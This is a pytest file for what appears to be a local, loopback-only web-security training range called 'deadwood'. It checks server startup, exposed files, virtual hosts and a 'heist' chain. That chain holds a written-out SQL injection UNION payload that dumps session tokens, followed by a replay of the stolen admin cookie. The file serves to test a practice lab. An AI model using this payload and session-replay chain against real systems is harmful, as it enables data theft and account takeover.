import threading
import urllib.error
import urllib.parse
import urllib.request

import pytest

import deadwood.levels  # noqa: F401
from deadwood import server


def test_serve_refuses_non_loopback():
    with pytest.raises(PermissionError):
        server.serve("0.0.0.0", 0, allow_unsafe=False)


def test_http_smoke(monkeypatch, tmp_path):
    """The range actually serves: the map and a level app both answer 200."""
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    world = server.World()
    httpd = server._Server(("127.0.0.1", 0), world)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    port = httpd.server_address[1]
    try:
        base = f"http://127.0.0.1:{port}"
        assert b"Deadwood" in urllib.request.urlopen(base + "/", timeout=5).read()
        assert b"Staff Directory" in urllib.request.urlopen(
            base + "/l/first-blood/app?id=1", timeout=5).read()
    finally:
        httpd.shutdown()


def test_surface_and_heist_over_http(monkeypatch, tmp_path):
    """The wider recon surface and the full heist chain, exercised over real HTTP."""
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    world = server.World()
    httpd = server._Server(("127.0.0.1", 0), world)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    port = httpd.server_address[1]
    base = f"http://127.0.0.1:{port}"

    def get(path, headers=None):
        req = urllib.request.Request(base + path, headers=headers or {})
        try:
            r = urllib.request.urlopen(req, timeout=5)
            return r.status, r.read(), dict(r.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read(), dict(e.headers)

    try:
        assert b"repositoryformatversion" in get("/.git/config")[1]      # exposed file
        status, body, _ = get("/no-such-page-xyz")
        assert status == 200 and b"No such page" in body                 # soft-404
        assert b"Internal Ops" in get("/", headers={"Host": "internal"})[1]   # vhost
        # the heist: SQLi the directory -> dump sessions -> ride the admin token to the vault
        dump_q = urllib.parse.urlencode({"id": "0 UNION SELECT username,token,role FROM sessions-- -"})
        assert b"dw-admin-7f3a9c1e" in get(f"/l/the-whole-hand/app/directory?{dump_q}")[1]
        _, body, _ = get("/l/the-whole-hand/app/vault", headers={"Cookie": "session=dw-admin-7f3a9c1e"})
        assert b"the_whole_hand" in body
    finally:
        httpd.shutdown()
